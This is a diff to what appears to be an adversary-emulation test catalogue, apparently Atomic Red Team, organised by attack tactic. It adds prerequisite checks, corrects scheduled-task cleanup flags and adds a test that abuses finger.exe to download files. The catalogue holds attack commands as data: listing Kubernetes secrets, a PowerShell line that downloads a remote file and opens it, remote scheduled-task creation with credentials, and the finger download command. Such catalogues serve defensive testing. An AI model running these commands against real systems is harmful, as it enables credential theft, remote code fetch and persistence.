@@ -558,10 +558,17 @@ credential-access:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl get secrets -n #{namespace}
 
 '
@@ -2338,6 +2345,18 @@ credential-access:
         there is no output\n"
       supported_platforms:
       - windows
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -16363,7 +16382,7 @@ privilege-escalation:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -44730,7 +44749,7 @@ persistence:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -60593,7 +60612,7 @@ execution:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -65396,6 +65415,25 @@ command-and-control:
         command: "(New-Object Net.WebClient).DownloadString('#{target_remote_file}')
           | Out-File #{output_file}; Invoke-Item #{output_file}\n"
         name: powershell
+    - name: File download with finger.exe on Windows
+      auto_generated_guid: 5f507e45-8411-4f99-84e7-e38530c45d01
+      description: |
+        Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.
+        Because this is being tested on the localhost, you should not be expecting a successful connection
+        https://www.exploit-db.com/exploits/48815
+        https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_host:
+          description: Remote hostname or IP address
+          type: String
+          default: localhost
+      executor:
+        name: command_prompt
+        command: 'finger base64_filedata@#{remote_host}
+
+'
   T1090.001:
     technique:
       external_references:
